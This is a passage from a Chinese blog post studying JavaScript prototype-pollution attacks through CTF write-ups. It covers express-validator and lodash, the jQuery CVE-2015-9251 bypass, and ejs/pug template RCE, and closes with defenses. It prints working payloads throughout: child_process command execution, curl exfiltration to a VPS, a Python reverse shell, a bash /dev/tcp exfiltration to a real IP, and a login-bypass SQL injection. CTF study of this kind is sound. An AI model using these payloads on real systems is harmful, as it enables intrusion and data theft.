alt=image-20211223231735649></p><p><code>run</code>方法中调用<code>context.setData</code>来调用传入的<code>sanitizer</code>修改新的值</p><p>再往前，回到<code>node_modules\express-validator\src\middlewares\check.js</code>，刚才我们只看了返回值，但它会先在第12行new一个<code>ContextRunnerImpl</code></p><p><code>node_modules\express-validator\src\chain\context-runner-impl.js</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png alt=image-20211223232603577></p><p>它的<code>run</code>方法在之前的第15行被调用，可以看作是<code>middleware</code>调用的入口，这个<code>run</code>先申请了一个<code>context</code>（可以理解为http请求的上下文的一个封装），27行有一个for遍历，对于栈中的item（这个栈就是之前<code>addItem</code>的栈）再依次调用它的<code>run</code>方法</p><p>究极套娃，总结整个逻辑就是这样的：</p><p>首先将<code>validator</code>和<code>sanitizers</code>的方法绑定到<code>check</code>函数返回的<code>middleware</code>上，这些<code>validator</code>和<code>sanitizer</code>的方法是通过向<code>context.stack</code>中push <code>context-items</code>，最后在<code>ContextRunnerImpl.run</code>方法里遍历栈中的items，逐一调用其<code>run</code>方法实现<code>validation</code>或<code>sanitization</code></p><h6 id=结合lodashset扩大攻击面>结合lodash.set扩大攻击面</h6><p>在上面分析的最后部分我们提到了实际调用时的for循环</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png alt=image-20211223232603577></p><p>45行有个if，如果满足<code>options.dryRun</code>为空且<code>reqValue!==instance.value</code>，就可以调用<code>_.set</code>来重置<code>req[location]</code>中的值为<code>newValue</code>；而第一个默认是undefined不用管，而第二个，以<code>trim</code>为例，如果传入的参数两边存在空白字符，经过<code>trim</code>处理后就可以满足这个条件了</p><p>这个<code>_.set</code>正是我们的老朋友<code>lodash.set</code>，尝试lodash.set的payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;__proto__.[whoami]&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;amiz &#34;</span><span style=color:#111>}</span>
</span></span></code></pre></div><p>虽然满足了条件但并不能污染成功，在关键处打断点，定位到<code>node_modules\express-validator\src\select-fields.js</code>（因为在<code>ContextRunnerImpl.js</code>中的24行，在调用各种具体的<code>run</code>方法之前先调用了<code>this.selectFields</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224001541686.png alt=image-20211224001541686></p><p>35行是一个<code>*</code>的通配符，<code>{"a":{"b":"123"}}</code>这样的body参数就会对b进行验证，但是如果是<code>{"a.b":"123"}</code>这样的，会将<code>a.b</code>视作一个key，不会对<code>a.b</code>进行验证，在传入<code>express</code>时不会自动进行<code>unfaltten</code>而变为一个a对象包含一个b对象；但<code>express-validator</code>内部是通过lodash的<code>_get</code>和<code>_set</code>对对象进行赋值和取值，当传入<code>a.b</code>时lodash会自动进行一个套娃（具体的前面已经写了），为了防止这种情况的出现，<code>express-validator</code>对key进行检查，可以看到57行，出现<code>.</code>就会在周围加一对方括号，起到转义作用</p><p>所以我们传入的就会变成这样</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112317775.png alt=image-20211224112317775></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112910994.png alt=image-20211224112910994></p><p>在两端多了方括号，破坏了我们原来的payload，相当于</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>_</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>a</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#d88200>&#34;__proto__.[whoami]&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;amiz&#34;</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>_</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#75af00>a</span><span style=color:#111>,</span><span style=color:#d88200>&#34;[\&#34;__proto__.[whoami]\&#34;]&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>2</span><span style=color:#111>)</span>	<span style=color:#75715e>// 多了方括号
</span></span></span></code></pre></div><p>我们要利用<code>select-fileds</code>的一些转义的技巧来bypass</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#111>{</span><span style=color:#d88200>&#34;\&#34;].__proto__[\&#34;whoami&#34;</span><span style=color:#f92672>:</span><span style=color:#d88200>&#34;Vulnerable&#34;</span><span style=color:#111>}</span>
</span></span></code></pre></div><p>相当于</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>_</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>c</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#d88200>&#34;\&#34;].__proto__[\&#34;whoami&#34;</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#34;Vulnerable&#34;</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#75af00>_</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#75af00>c</span><span style=color:#111>,</span><span style=color:#d88200>&#34;[\&#34;\&#34;].__proto__[\&#34;whoami\&#34;]&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>2</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>构造payload的时候还要注意<code>lodash.set</code>，如果第二个参数path的值等于第一个参数object的键Key时会污染失败</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224004615093.png alt=image-20211224004615093></p><p>可以污染原型顺利增加一个参数，但是它的参数却是一个空的字符串，原因是<code>_set</code>时的第三个参数<code>newValue</code>时利用变化后的key重新从<code>req[location]</code>中取出来的，原本应该<code>undefined</code>，但是我们经过<code>Sanitization</code>的run方法时有一个<code>toString</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003615973.png alt=image-20211224003615973></p><p>所以<code>undefined</code>变为了空字符串<code>''</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003735423.png alt=image-20211224003735423></p><p>经过了这一系列的处理，<code>reqValue</code>为空就会经过<code>_.get</code>重新取值，而这里得到的<code>undefined</code>不会被<code>toString</code>处理，在46行处<code>undefined!==''</code>依旧为真，继续<code>_.set</code>，进行原型链的污染</p><p>虽然只能有限的进行污染一个空字符串，但是由于js的一些特性 比如在判断中<code>''</code>返回false，我们可以把原本的地方的判断条件结果进行一些反转，从而绕过某些限制或改变代码走向（跟hitcon的那个翻转bit的思想有点像了</p><h6 id=jquery的久远rce---cve-2015-9251>jQuery的久远rce - CVE-2015-9251</h6><p>当<code>jQuery</code>的url返回头的<code>content-type</code>字段为<code>text/javascript</code>时，即使没有设置<code>dataType: 'script'</code>也会自动<code>eval</code>返回内容</p><p>这个漏洞做到了XSS->RCE的效果，不过很早就修复了（jQuery 3.0.0），找到<a href=https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/script.js#L23>修复的代码</a>看能否绕过</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224140957720.png alt=image-20211224140957720></p><p>通过<code>s.crossDomain</code>来作为if判断的条件，如果为真则不会执行内容</p><p>而这个<code>s.CrossDomain</code>在默认设置中不存在；不过在jQuery初始化时用到了<code>jQuery.ajaxExtend</code>这个函数，内部通过for遍历src的key <a href=https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/ajax.js#L115>链接在这里</a></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224152619790.png alt=image-20211224152619790></p><p>会去找对象上不存在但原型链上存在的key，如果此时原型链被污染就会连带到target，示例</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>polluted</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>a</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>let</span> <span style=color:#75af00>c</span> <span style=color:#f92672>=</span> <span style=color:#111>{}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span><span style=color:#111>(</span> <span style=color:#75af00>key</span> <span style=color:#00a8c8>in</span> <span style=color:#75af00>c</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>a</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#75af00>c</span><span style=color:#111>[</span><span style=color:#75af00>key</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>keys</span><span style=color:#111>(</span><span style=color:#75af00>a</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// [ &#39;polluted&#39; ]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>a</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// { polluted: &#39;&#39; }
</span></span></span></code></pre></div><p>经过污染之后<code>s.crossDomain=''</code>变为空字符串，在经过下面这个判断</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224153115106.png alt=image-20211224153115106></p><p>在默认中的<code>s.crossDomain</code>是undefined，而<code>undefined==null</code>为true，所以在正常情况下可以进入这个判断，不过前面我们污染它为<code>''</code>，于是这里保留空字符串不进入判断，并且上面的<code>if(s.crossDomain)</code>也不会通过判断，导致<code>s.content.script=true</code>，就可以rce了</p><h6 id=异步编程的陷阱>***异步编程的陷阱</h6><p>这块其实不是特别懂</p><p><img src=https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022104530048.png alt=image-20201022104530048></p><p>直接拿wp里的图了）这里的<code>requests</code>是一个异步函数，在删除<code>this.types</code>数组对应的项之后，由于异步函数的特性，<code>express</code>不会等待<code>requests</code>而是继续执行下面的代码，所以<code>this.datas</code>中对应项的删除也会被对应的异步延后，这样一来在某一时刻会存在这样的情况</p><p><img src=https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022121557273.png alt=image-20201022121557273></p><p>我们可以利用异步函数导致的数据不一致发送一些恶意请求，构造<code>this.types</code>和<code>this.datas</code>中间一端像这个样子</p><p><img src=https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022151504944.png alt=image-20201022151504944></p><p>然后让题目访问我们自己的url；由于后端request请求的是本地环回速度很快，所以为了在<code>dataRepo.D</code>中request没结束时构造好我们想要的数据形式，需要<code>dataRepo.D</code>中requests耗时比我们构造的时间久，比如先post一些链表形式串起来的数据，比如</p><p><img src=https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022131845955.png alt=image-20201022131845955></p><p>然后再发起链表头数据的DELETE请求，让requests进行递归的删除，这样就可以通过这个链表的长度从而控制requests花费的时间，让requests耗费的时间符合我们的预期；链表的实际长度需要根据不同的网络状况进行调整</p><h6 id=跨域问题>跨域问题</h6><p>设置请求头时除了有<code>text/javascript</code>以外还要另外设置允许跨域访问的请求头</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Content-Type&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;text/javascript&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Access-Control-Allow-Origin&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;*&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>setHeader</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Access-Control-Allow-Headers&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;X-Requested-With, crossDomain&#34;</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><a href=https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web/oooooooldjs>详细的exp&docker见官方仓库</a></p><h6 id=关于任意原型链污染>关于任意原型链污染</h6><p>由于出题人加了个json的中间件允许传入object，导致可以做到任意污染（这下格局打开了）</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;block&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;__proto__&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;a&#34;</span><span style=color:#111>:</span> <span style=color:#ae81ff>123</span><span style=color:#111>}},</span> <span style=color:#f92672>&#34;block\&#34;].__proto__[\&#34;a&#34;</span><span style=color:#111>:</span> <span style=color:#ae81ff>123</span><span style=color:#111>}</span>
</span></span></code></pre></div><h5 id=安洵杯-2020validator>[安洵杯 2020]Validator</h5><p><a href=https://xz.aliyun.com/t/8581#toc-2>https://xz.aliyun.com/t/8581#toc-2</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>.</span><span style=color:#75af00>password</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;D0g3_Yes!!!&#34;</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>info</span><span style=color:#111>.</span><span style=color:#75af00>system_open</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>info</span><span style=color:#111>.</span><span style=color:#75af00>system_open</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;yes&#34;</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>const</span> <span style=color:#75af00>flag</span> <span style=color:#f92672>=</span> <span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/flag&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>200</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>flag</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>400</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;The login is successful, but the system is under test and not open...&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>400</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Login Fail, Password Wrong!&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span></code></pre></div><p>利用上面任意原型链污染的点来使<code>info.system_open</code>为真</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;password&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;D0g3_Yes!!!&#34;</span><span style=color:#111>,</span> <span style=color:#f92672>&#34;a&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;__proto__&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;system_open&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;yes&#34;</span><span style=color:#111>}},</span> <span style=color:#f92672>&#34;a\&#34;].__proto__[\&#34;system_open&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;yes&#34;</span> <span style=color:#111>}</span>
</span></span></code></pre></div><h5 id=巅峰极客-2021ezjs>[巅峰极客 2021]ezjs</h5><p><a href=https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5>https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-5</a></p><p>不过这里不能直接传json，用urlencode</p><pre tabindex=0><code>username=amiz&amp;password=amiz&amp;&#34;].__proto__[&#34;isadmin=amiz&amp;&#34;].__proto__[&#34;debug=amiz
</code></pre><p>所以就不需要反斜杠什么的去转义json了</p><p>污染admin和debug之后成为用admin的cookie打pug的getshell，有CVE-2021-21353</p><pre tabindex=0><code>/admin?p=&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;whoami&#39;);_=(&#39;
</code></pre><pre tabindex=0><code>curl -F &#34;file=`ls -al /|base64`&#34; http://VPS
curl -F &#34;file=`tac /root/flag.txt`&#34; http://VPS
</code></pre><p>curl外带，或者python shell</p><pre tabindex=0><code>/admin/?p=&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &#34;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&#39;/bin/bash\&#39;,\&#39;-i\&#39;]);&#34;&#39;);_=(&#39;
</code></pre><h4 id=ejs316--lodash>ejs(&lt;=3.1.6) + lodash</h4><pre tabindex=0><code>payload=&#34;ee;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag &amp;&amp; echo successed&#39;).toString();//&#34;
</code></pre><h5 id=xnuca2019qualifierhardjs>[XNUCA2019Qualifier]HardJS</h5><p><a href=https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs>https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></p><p>前端和后端分别存在原型污染的漏洞，前端的问题来自于ejs的经典<code>outputFunctionName</code>（或者<code>escapeFunction</code>）</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173627138.png alt=image-20220426173627138></p><p>后端的问题来自于lodash.defaultsDeep</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426173612125.png alt=image-20220426173612125></p><p>知道漏洞点了，我们如何利用呢？</p><p>前端的ejs直接弹shell</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;type&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;test&#34;</span><span style=color:#111>,</span><span style=color:#f92672>&#34;content&#34;</span><span style=color:#111>:{</span><span style=color:#f92672>&#34;constructor&#34;</span><span style=color:#111>:{</span><span style=color:#f92672>&#34;prototype&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;outputFunctionName&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;a=1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;echo $FLAG&gt;/dev/tcp/101.35.114.107/8426\&#34;&#39;)//&#34;</span><span style=color:#111>}}}}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;constructor&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;prototype&#34;</span><span style=color:#111>:</span> <span style=color:#111>{</span><span style=color:#f92672>&#34;client&#34;</span><span style=color:#111>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>,</span><span style=color:#f92672>&#34;escapeFunction&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>&#34;1; return
</span></span></span><span style=display:flex><span><span style=color:#d88200>process.env.FLAG&#34;</span><span style=color:#111>,</span><span style=color:#f92672>&#34;debug&#34;</span><span style=color:#111>:</span><span style=color:#00a8c8>true</span><span style=color:#111>,</span> <span style=color:#f92672>&#34;compileDebug&#34;</span><span style=color:#111>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>}}}</span>
</span></span></code></pre></div><p>[MRCTF 2022]hurry up</p><h4 id=ejs--js-extend>ejs + js-extend</h4><h5 id=gkctf-2021easynode>[GKCTF 2021]easynode</h5><p>一看依赖文件，经典ejs 3.1.5肯定有原型链污染，同时需要别的配合，这里的孤儿选手是js-extend</p><p>首先是绕admin权限的登录，在登录处对用户名和密码进行waf处理</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220426181110393.png alt=image-20220426181110393></p><p>用了<code>==</code>弱比较，并且safeStr用了相加，两个数组相加会得到一个字符串</p><pre tabindex=0><code>username[]=admin&#39;#&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=(&amp;password=123456
</code></pre><p>这样sql语句会变为</p><pre tabindex=0><code>select * from test where username = &#39;admin&#39;#,1,1,1,1,1,1,1,1,1*&#39; and password = &#39;123456&#39;
</code></pre><p>直接注释掉password登录</p><p>得到admin的token之后再到/addAdmin处添加用户（cookie的token字段记得修改）</p><pre tabindex=0><code>username=__proto__&amp;password=123
</code></pre><p>/adminDIV处post</p><pre tabindex=0><code>data={&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuMzUuMTE0LjEwNy84NDI2IDA%2BJjEi|base64 -d|bash&#39;);var __tmp2&#34;}
</code></pre><p>注意一定要b64+urlencode，再次访问/admin触发rce</p><h2 id=防御策略>防御策略</h2><h3 id=冻结原型>冻结原型</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>freeze</span><span style=color:#111>(</span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>freeze</span><span style=color:#111>(</span><span style=color:#111>Object</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>({}).</span><span style=color:#75af00>__proto__</span><span style=color:#111>.</span><span style=color:#75af00>test</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>123</span>
</span></span><span style=display:flex><span><span style=color:#111>({}).</span><span style=color:#75af00>test</span> <span style=color:#75715e>// this will be undefined
</span></span></span></code></pre></div><h3 id=白名单黑名单>白名单/黑名单</h3><p>迭代对象属性，过滤<code>__proto__</code>和<code>prototype</code>，还有一些其它的属性</p><h3 id=使用map结构>使用map结构</h3><p>用map数据结构来代替自带的对象结构</p><h3 id=使用create进行防御>使用create进行防御</h3><p>就很nb，它创建好的对象找不到原型链</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>obj</span> <span style=color:#f92672>=</span> <span style=color:#111>Object</span><span style=color:#111>.</span><span style=color:#75af00>create</span><span style=color:#111>(</span><span style=color:#00a8c8>null</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>__proto__</span> <span style=color:#75715e>// undefined
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>obj</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span> <span style=color:#75715e>// undefined
</span></span></span></code></pre></div><hr><details><summary><h4 class=inline>以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（</h4></summary><p><a href=https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html>深入理解 JavaScript Prototype 污染攻击</a></p><p><a href=https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf>JavaScript_prototype_pollution_attack_in_NodeJS.pdf</a></p><p><a href=https://whoamianony.top/2021/10/30/Web%E5%AE%89%E5%85%A8/Nodejs%20%E5%B8%B8%E8%A7%81%E6%A8%A1%E5%9D%97%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%B8%8E%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%20RCE/>Nodejs 常见模块原型链污染与常见模板污染向 RCE</a></p><p><a href=https://juejin.cn/post/6963950629240733727>前端原型链污染漏洞竟可以拿下服务器shell？</a></p><p><a href=https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md>oooooooldjs writeup1</a> | <a href=https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/oooooooldjs/writeup.md>wp2</a></p><p><a href=https://juejin.cn/post/6844904030221631495>在JavaScript中实现链式调用</a></p></details></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
